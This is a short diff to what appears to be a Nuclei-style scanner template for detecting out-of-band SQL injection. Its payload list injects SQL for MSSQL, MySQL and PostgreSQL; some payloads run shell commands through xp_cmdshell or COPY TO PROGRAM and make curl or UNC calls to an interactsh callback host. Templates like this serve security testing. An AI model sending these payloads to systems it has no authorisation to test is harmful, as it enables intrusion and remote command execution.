@@ -10,7 +10,7 @@ http:
   - method: GET
     path:
       - "{{BaseURL}}"
-	  
+      
     payloads:
       oob_payloads:
         # MSSQL
@@ -19,7 +19,7 @@ http:
         - "1; exec master..xp_subdirs '\\\\{{interactsh-url}}\\\\abc'--"
         - "1; exec xp_cmdshell 'curl http://{{interactsh-url}}/cmd'--"
         # MySQL
-        - "1' UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\abc')-- -"
+        - "1\' UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\abc')-- -"
         # PostgreSQL
         - "1; COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}/abc'--"
         # Oracle
